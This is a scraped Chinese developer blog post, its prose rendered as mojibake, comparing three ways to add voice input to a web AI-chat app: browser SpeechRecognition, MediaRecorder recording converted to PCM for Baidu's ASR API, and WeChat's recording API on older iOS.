itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è›¤èŸ†å¤§ç‹æœ‰è¯è¯´"/> <meta itemprop="url" content="https://juejin.cn/user/4314940145153879"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç½‘é¡µç«¯è¯­éŸ³è¯†åˆ«æŠ€æœ¯ä½¿ç”¨æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4314940145153879/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è›¤èŸ†å¤§ç‹æœ‰è¯è¯´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:30:18.000Z" title="Tue Jan 20 2026 00:30:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>éœ€æ±‚ï¼šé¡¹ç›®æ˜¯ä¸€ä¸ªæ”¯æŒPCå’Œæ‰‹æœºç«¯çš„ ai å¯¹è¯å¹³å°ï¼Œéœ€è¦æ”¯æŒç”¨æˆ·è¯­éŸ³è¾“å…¥é—®é¢˜ï¼Œai å›ç­”ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c06390ed0c004a2b8870baf02c150480~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=U1cxEbU6e3IHUvdBafk1BHKDmkc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">æ–¹æ¡ˆa ï¼šæµè§ˆå™¨æä¾› webkitSpeechRecognition å¯ä»¥ç›´æ¥è¯†åˆ«ç”¨æˆ·è¯­éŸ³å¹¶è½¬æ¢æ–‡å­—ã€‚</h2>
<h3 data-id="heading-1">ä½¿ç”¨ï¼š</h3>
<pre><code class="hljs language-ini" lang="ini">
// æ£€æµ‹æ˜¯å¦æ”¯æŒ Web Speech <span class="hljs-attr">API</span> ===
const <span class="hljs-attr">isWebSpeechSupported</span> = typeof window !== <span class="hljs-string">'undefined'</span> &amp;&amp; !!(window.SpeechRecognition || window.webkitSpeechRecognition)<span class="hljs-comment">;</span>
if(!isWebSpeechSupported) return alert("ä¸æ”¯æŒè¯­éŸ³è¯†åˆ«ï¼")
<span class="hljs-attr">recognition</span> = new webkitSpeechRecognition()<span class="hljs-comment">;</span>
<span class="hljs-attr">recognition.lang</span> = <span class="hljs-string">'zh-CN'</span><span class="hljs-comment">; // è®¾ç½®è¯­éŸ³è¯†åˆ«çš„è¯­è¨€ä¸ºä¸­æ–‡</span>
<span class="hljs-attr">recognition.continuous</span> = <span class="hljs-literal">true</span>

<span class="hljs-attr">recognition.onresult</span> = (event) =&gt; {
  const <span class="hljs-attr">speechResult</span> = event.results[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].transcript<span class="hljs-comment">;</span>
  console.log("è¯­éŸ³è¯†åˆ«ç»“æœï¼š", speechResult)<span class="hljs-comment">;</span>
  eventBus.emit('senMsg', speechResult)<span class="hljs-comment">;  // è‡ªå·±çš„ä¸šåŠ¡ä»£ç </span>
}<span class="hljs-comment">;</span>
<span class="hljs-attr">recognition.onerror</span> = (event) =&gt; {
  console.log("å‘ç”Ÿé”™è¯¯ï¼š", event.error)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>recognition.start() å¼€å§‹å½•éŸ³</p>
<p>recognition.stop() ç»“æŸå½•éŸ³ -- ä¼šæ‰§è¡Œ onresult å›è°ƒå‡½æ•°è¿”å›è¯†åˆ«è¯­éŸ³æ–‡å­—</p>
<p>recognition.abort() ç»ˆæ­¢æ‰€æœ‰æ“ä½œ - ä¸ä¼šæ‰§è¡Œ onresult å›è°ƒå‡½æ•°</p>
<h3 data-id="heading-2">ç¼ºé™·ï¼šSpeechRecognition ä¸æ”¯æŒIOSå¹³å°ã€‚</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93360fe0889d4ec3b7094d12d72a0420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=90fG4yGQYFpxc4Kgqx2poSWWqMs%3D" alt="" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æºï¼šai</p>
<h2 data-id="heading-3">æ–¹æ¡ˆbï¼š<strong>å‰ç«¯å½•éŸ³ + åç«¯ ASRï¼ˆè¯­éŸ³è½¬æ–‡å­—ï¼‰</strong></h2>
<p>ç”¨æˆ·ç‚¹å‡»â€œå¼€å§‹è¯´è¯â€ â†’ å‰ç«¯è°ƒç”¨éº¦å…‹é£å½•åˆ¶éŸ³é¢‘ï¼ˆWAV/MP3ï¼‰ â†’ ä¸Šä¼ éŸ³é¢‘åˆ°æœåŠ¡å™¨ â†’ æœåŠ¡å™¨è°ƒç”¨ ASR å¼•æ“ï¼ˆå¦‚é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€ç™¾åº¦ã€Google Cloudï¼‰ â†’ è¿”å›è¯†åˆ«æ–‡æœ¬ç»™å‰ç«¯</p>
<h3 data-id="heading-4">ä½¿ç”¨ï¼šè¿™é‡Œä½¿ç”¨ç™¾åº¦ ASRï¼ŒéŸ³é¢‘æµéœ€è¦è½¬æ¢ PCM äºŒè¿›åˆ¶</h3>
<p>pcmå’Œblobçš„åŒºåˆ«ï¼špcmæ˜¯åŸå§‹éŸ³é¢‘æ•°æ®çš„ç¼–ç æ ¼å¼ï¼Œ Blobï¼ˆBinary Large Objectï¼‰æ˜¯æµè§ˆå™¨ä¸­ç”¨äºå°è£…äºŒè¿›åˆ¶æ•°æ®çš„å®¹å™¨å¯¹è±¡</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ba88cbbf7d47fc90cd659f12a43622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=%2FtMaeIrRA%2BMf6CbzxSJK4c2TTcA%3D" alt="" loading="lazy"/></p>
<p>å›¾ç‰‡æ¥æº ï¼šai</p>
<p>ç›¸å…³ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">try {
  let <span class="hljs-attr">recognition</span> = null
  let chunks: Blob<span class="hljs-section">[]</span> = <span class="hljs-section">[]</span><span class="hljs-comment">;</span>
  // è¯·æ±‚éº¦å…‹é£æƒé™å‡†å¤‡å½•éŸ³
  let <span class="hljs-attr">stream</span> = await navigator.mediaDevices.getUserMedia({ audio: <span class="hljs-literal">true</span> })<span class="hljs-comment">;</span>
  <span class="hljs-attr">recognition</span> = new MediaRecorder(stream)<span class="hljs-comment">;</span>
  // ç›‘å¬å½•éŸ³æ•°æ® å¹¶æ”¶é›†åˆ° chunks äºŒè¿›åˆ¶æ•°ç»„
  <span class="hljs-attr">recognition.ondataavailable</span> = (e) =&gt; {
    <span class="hljs-attr">chunks</span> = []
    <span class="hljs-attr">chunks.length</span> = <span class="hljs-number">0</span>
    if (e.data.size &gt; 0) {
      chunks.push(e.data)<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>
  // 3. å‡†å¤‡æ¥æ”¶å½•éŸ³æ•°æ®
  // å½•éŸ³ç»“æŸæ—¶å¤„ç†å®Œæ•´éŸ³é¢‘
  <span class="hljs-attr">recognition.onstop</span> = async () =&gt; {
    // âœ… ä½¿ç”¨çœŸå®çš„ mimeType
    const <span class="hljs-attr">mimeType</span> = recognition!.mimeType || <span class="hljs-string">'audio/mp4'</span><span class="hljs-comment">;</span>
    const <span class="hljs-attr">blob</span> = new Blob(chunks, { type: mimeType })<span class="hljs-comment">;   // </span>

    // 1. è½¬ PCM / çœ‹è‡ªå·±çš„ ASR äº‘æœåŠ¡æ˜¯å¦éœ€è¦
    const <span class="hljs-attr">pcmData</span> = await audioBlobToPcm(blob)<span class="hljs-comment">;</span>
    console.log('PCM é•¿åº¦:', pcmData.byteLength, 'å­—èŠ‚')<span class="hljs-comment">;</span>

    // 2. è°ƒç”¨ ç™¾åº¦ ASR æ¥å£
    const <span class="hljs-attr">result</span> = await fetchAsrBaiduPro(pcmData, <span class="hljs-string">"è‡ªå·±çš„token"</span>)<span class="hljs-comment">;</span>
    console.log('è¯­éŸ³è¯†åˆ«è¿”å›', result)<span class="hljs-comment">;</span>


    if (<span class="hljs-attr">result.err_no</span> === <span class="hljs-number">0</span> &amp;&amp; result.result?.[<span class="hljs-number">0</span>]) {
      const <span class="hljs-attr">text</span> = result.result[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
      console.log('è¯†åˆ«ç»“æœ:', text)<span class="hljs-comment">;</span>
      eventBus.emit('senMsg', text)<span class="hljs-comment">;  // å¤„ç†è‡ªå·±çš„ä¸šåŠ¡</span>
    } else {
      console.log('ASR é”™è¯¯:', result.err_msg)<span class="hljs-comment">;</span>
      toast.fail("æ—¶é—´å¤ªçŸ­,æœªè¯†åˆ«åˆ°è¯­éŸ³")
      // alert(`è¯†åˆ«å¤±è´¥: ${result.err_msg}`)<span class="hljs-comment">;</span>
    }
    // ç›´æ¥ä¸‹è½½éŸ³é¢‘æŸ¥çœ‹----ç”¨äºæµ‹è¯•éŸ³é¢‘ä»£ç 
    // const <span class="hljs-attr">url</span> = URL.createObjectURL(blob)<span class="hljs-comment">;</span>
    // const <span class="hljs-attr">a</span> = document.createElement(<span class="hljs-string">'a'</span>)<span class="hljs-comment">;</span>
    // <span class="hljs-attr">a.href</span> = url<span class="hljs-comment">;</span>
    // <span class="hljs-attr">a.download</span> = `recording-<span class="hljs-variable">${Date.now()}</span>.<span class="hljs-variable">${getExt(mimeType)}</span>`<span class="hljs-comment">;</span>
    // document.body.appendChild(a)<span class="hljs-comment">;</span>
    // a.click()<span class="hljs-comment">;</span>
    // document.body.removeChild(a)<span class="hljs-comment">;</span>

    // // é‡Šæ”¾å†…å­˜ï¼ˆå»¶è¿Ÿä¸€ç‚¹ï¼Œç¡®ä¿ä¸‹è½½å®Œæˆï¼‰
    // setTimeout(() =&gt; URL.revokeObjectURL(url), 1000)<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

} catch (error) {
  console.log(error)<span class="hljs-comment">;  // è¿™é‡Œç›‘å¬ä¸åŒæŠ¥é”™å¤„ç†ä¸šåŠ¡</span>
  toast.fail('æ‰¾ä¸åˆ°ç¬¦åˆæ¡ä»¶çš„éŸ³è§†é¢‘è®¾å¤‡')
}
</code></pre>
<p>blob è½¬ PCM å‡½æ•°å°è£…</p>
<pre><code class="hljs language-ini" lang="ini">// utils/audioToPcm.ts

/**
 * å°†éŸ³é¢‘ Blobï¼ˆå¦‚ audio/mp4ï¼‰è§£ç ä¸º 16kHz/16bit/å•å£°é“ PCM ArrayBuffer
 * @param audioBlob - å½•éŸ³å¾—åˆ°çš„éŸ³é¢‘ Blob
 * @returns PCM æ ¼å¼çš„ ArrayBuffer  
 */
export async function audioBlobToPcm(audioBlob: Blob): Promise&lt;ArrayBuffer&gt; {
    return new Promise((resolve, reject) =&gt; {
        const <span class="hljs-attr">fileReader</span> = new FileReader()<span class="hljs-comment">;</span>
        <span class="hljs-attr">fileReader.onload</span> = async () =&gt; {
            try {
                const <span class="hljs-attr">audioContext</span> = new (window.AudioContext || (window as any).webkitAudioContext)()<span class="hljs-comment">;</span>
                const <span class="hljs-attr">audioData</span> = await audioContext.decodeAudioData(fileReader.result as ArrayBuffer)<span class="hljs-comment">;</span>

                // é‡é‡‡æ ·åˆ° 16kHzï¼ˆå¯é€‰ï¼Œä½†ç™¾åº¦è¦æ±‚ 16kï¼‰
                const <span class="hljs-attr">sampleRate</span> = <span class="hljs-number">16000</span><span class="hljs-comment">;</span>
                let <span class="hljs-attr">offlineContext</span> = new <span class="hljs-literal">Off</span>lineAudioContext(<span class="hljs-number">1</span>, audioData.duration * sampleRate, sampleRate)<span class="hljs-comment">;</span>
                let <span class="hljs-attr">source</span> = <span class="hljs-literal">off</span>lineContext.createBufferSource()<span class="hljs-comment">;</span>
                <span class="hljs-attr">source.buffer</span> = audioData<span class="hljs-comment">;</span>
                source.connect(offlineContext.destination)<span class="hljs-comment">;</span>
                source.start()<span class="hljs-comment">;</span>

                const <span class="hljs-attr">renderedBuffer</span> = await <span class="hljs-literal">off</span>lineContext.startRendering()<span class="hljs-comment">;</span>

                // è½¬ä¸º 16-bit PCM
                const <span class="hljs-attr">float32Array</span> = renderedBuffer.getChannelData(<span class="hljs-number">0</span>)<span class="hljs-comment">; // å•å£°é“</span>
                const <span class="hljs-attr">int16Array</span> = new Int16Array(float32Array.length)<span class="hljs-comment">;</span>
                for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; float32Array.length; i++) {</span>
                    // æµ®ç‚¹ <span class="hljs-section">[-1, 1]</span> â†’ 16ä½æ•´æ•° <span class="hljs-section">[-32768, 32767]</span>
                    const <span class="hljs-attr">s</span> = Math.max(-<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">1</span>, float32Array[i]))<span class="hljs-comment">;</span>
                    int16Array<span class="hljs-section">[i]</span> = s &lt; 0 ? s * 0x8000 : s * 0x7FFF<span class="hljs-comment">;</span>
                }

                resolve(int16Array.buffer)<span class="hljs-comment">;</span>
            } catch (err) {
                reject(err)<span class="hljs-comment">;</span>
            }
        }<span class="hljs-comment">;</span>
        <span class="hljs-attr">fileReader.onerror</span> = () =&gt; reject(fileReader.error)<span class="hljs-comment">;</span>
        fileReader.readAsArrayBuffer(audioBlob)<span class="hljs-comment">;</span>
    })<span class="hljs-comment">;</span>
}
</code></pre>
<p>fetchè°ƒç”¨ ç™¾åº¦ ASR å‡½æ•°å°è£…ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils/asrBaiduPro.ts</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">AsrBaiduProResult</span> {
    <span class="hljs-attr">err_no</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">err_msg</span>: <span class="hljs-built_in">string</span>;
    result?: <span class="hljs-built_in">string</span>[];
    sn?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * è°ƒç”¨ç™¾åº¦è¯­éŸ³è¯†åˆ« Pro APIï¼ˆéœ€ä¼ å…¥ PCM éŸ³é¢‘æ•°æ®ï¼‰
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pcmData</span> - PCM éŸ³é¢‘çš„ ArrayBufferï¼ˆ16kHz, 16bit, å•å£°é“ï¼‰
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">token</span> - ç™¾åº¦ OAuth2.0 access_token
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">cuid</span> - è®¾å¤‡å”¯ä¸€æ ‡è¯†ï¼ˆå»ºè®®å›ºå®šå€¼æˆ–ç”Ÿæˆï¼‰
 * <span class="hljs-doctag">@returns</span> è¯†åˆ«ç»“æœæ–‡æœ¬æ•°ç»„ï¼ˆresult[0] ä¸ºä¸»ç»“æœï¼‰
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAsrBaiduPro</span>(<span class="hljs-params">
    pcmData: <span class="hljs-built_in">ArrayBuffer</span>,
    token: <span class="hljs-built_in">string</span>,
    cuid: <span class="hljs-built_in">string</span> = <span class="hljs-string">'web-client-'</span> + <span class="hljs-built_in">Date</span>.now()
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">AsrBaiduProResult</span>&gt; {
    <span class="hljs-keyword">const</span> rate = <span class="hljs-number">16000</span>;
    <span class="hljs-keyword">const</span> channel = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> format = <span class="hljs-string">'pcm'</span>;
    <span class="hljs-keyword">const</span> devPid = <span class="hljs-number">80001</span>; <span class="hljs-comment">// æ™®é€šè¯ + å¸¦æ ‡ç‚¹ + æ•°å­—è¯†åˆ«</span>

    <span class="hljs-comment">// å°† PCM è½¬ä¸º Base64</span>
    <span class="hljs-keyword">const</span> base64Speech = <span class="hljs-title function_">arrayBufferToBase64</span>(pcmData);
    <span class="hljs-keyword">const</span> len = pcmData.<span class="hljs-property">byteLength</span>;

    <span class="hljs-keyword">const</span> payload = {
        format,
        rate,
        channel,
        <span class="hljs-attr">cuid</span>:<span class="hljs-string">'è‡ªå·±çš„æ ‡è¯†'</span>,
        <span class="hljs-attr">dev_pid</span>: devPid,
        token,
        len,
        <span class="hljs-attr">speech</span>: base64Speech,
    };

    <span class="hljs-keyword">const</span> url = <span class="hljs-string">'https://vop.baidu.com/pro_api'</span>;

    <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ã€ASRã€‘å¼€å§‹è¯·æ±‚ç™¾åº¦ Pro API...'</span>);
        <span class="hljs-keyword">const</span> t0 = performance.<span class="hljs-title function_">now</span>();
        <span class="hljs-comment">// xixi æ˜¯ vite çš„ proxy ä»£ç† https://vop.baidu.com/pro_api</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"/xixi"</span>, {
            <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
            <span class="hljs-attr">headers</span>: {
                <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json; charset=utf-8'</span>,
                <span class="hljs-title class_">Accept</span>: <span class="hljs-string">'application/json'</span>,
            },
            <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload),
        });

        <span class="hljs-keyword">const</span> t1 = performance.<span class="hljs-title function_">now</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ã€ASRã€‘è¯·æ±‚è€—æ—¶: <span class="hljs-subst">${(t1 - t0).toFixed(<span class="hljs-number">2</span>)}</span> ms`</span>);

        <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP <span class="hljs-subst">${response.status}</span>: <span class="hljs-subst">${response.statusText}</span>`</span>);
        }

        <span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">AsrBaiduProResult</span> = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
        <span class="hljs-keyword">return</span> data;
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ã€ASRã€‘è¯·æ±‚å¤±è´¥:'</span>, error);
        <span class="hljs-keyword">throw</span> error;
    }
}

<span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼šArrayBuffer â†’ Base64</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">arrayBufferToBase64</span>(<span class="hljs-params">buffer: <span class="hljs-built_in">ArrayBuffer</span></span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">let</span> binary = <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; bytes.<span class="hljs-property">length</span>; i++) {
        binary += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(bytes[i]);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">btoa</span>(binary);
}
</code></pre>
<h2 data-id="heading-5">æ–¹æ¡ˆcï¼šå¾®ä¿¡æä¾›çš„å½•éŸ³ api</h2>
<p>ä¸»è¦é’ˆå¯¹ä½ç‰ˆæœ¬çš„ IOS å’Œ å¾®ä¿¡å¯¹ getUserMedia ä¸æ”¯æŒã€‚</p>
<p>æ­£å¸¸ä½¿ç”¨ getUserMediaå¿…é¡»æ»¡è¶³ï¼šæ–°ç‰ˆæœ¬çš„ iOSï¼ˆâ‰¥14.3ï¼‰ + è¾ƒæ–°ç‰ˆæœ¬çš„å¾®ä¿¡ï¼ˆâ‰¥8.0.0ï¼‰ + ç”¨æˆ·ä¸»åŠ¨è§¦å‘äº†å½•éŸ³ï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰ + é¡µé¢æ˜¯ HTTPS</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fdoc%2Fservice%2Fguide%2Fh5%2Fjssdk.html%23%25E9%259F%25B3%25E9%25A2%2591%25E6%258E%25A5%25E5%258F%25A3" target="_blank" title="https://developers.weixin.qq.com/doc/service/guide/h5/jssdk.html#%E9%9F%B3%E9%A2%91%E6%8E%A5%E5%8F%A3" ref="nofollow noopener noreferrer">developers.weixin.qq.com/doc/serviceâ€¦</a></p>
<p>æ–¹æ¡ˆbå’ŒcåŒºåˆ«ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4c23159ab834e858ca9ab19afc884ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=Yph2aToIPL8KW5YvYrXGpk86efc%3D" alt="" loading="lazy"/></p>
<p>æ¥æº ai</p>
<p>å…¼å®¹æ€§å·®å¼‚ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26446a6c8c7247beb8006f085eace02a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=ACDbpn3wsPinwz4%2B8jxVaXOXFTg%3D" alt="" loading="lazy"/></p>
<p>æ¥æº ai</p>
<p>ä½ç‰ˆæœ¬IOSå…¼å®¹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">startRecording</span>() {
  <span class="hljs-comment">// 1. ä¼˜å…ˆå°è¯• Web å½•éŸ³ï¼ˆé€‚åˆ Android/PCï¼‰</span>
  if (isWechat() &amp;&amp; <span class="hljs-built_in">isIOS</span>()) {
    <span class="hljs-comment">// 2. iOS å¾®ä¿¡ â†’ å¼ºåˆ¶ä½¿ç”¨ wx.startRecord()</span>
    <span class="hljs-built_in">useWechatRecord</span>();
  } else {
    <span class="hljs-comment">// 3. å…¶ä»–ç¯å¢ƒ â†’ å°è¯• Web å½•éŸ³</span>
    <span class="hljs-built_in">useWebRecord</span>()<span class="hljs-selector-class">.catch</span>(() =&gt; {
      <span class="hljs-comment">// 4. å¤±è´¥åˆ™é™çº§åˆ° wx.startRecord()ï¼ˆå¦‚æœæ˜¯å¾®ä¿¡ï¼‰</span>
      if (isWechat()) <span class="hljs-built_in">useWechatRecord</span>();
      else <span class="hljs-built_in">alert</span>('å½“å‰ç¯å¢ƒä¸æ”¯æŒå½•éŸ³');
    });
  }
}
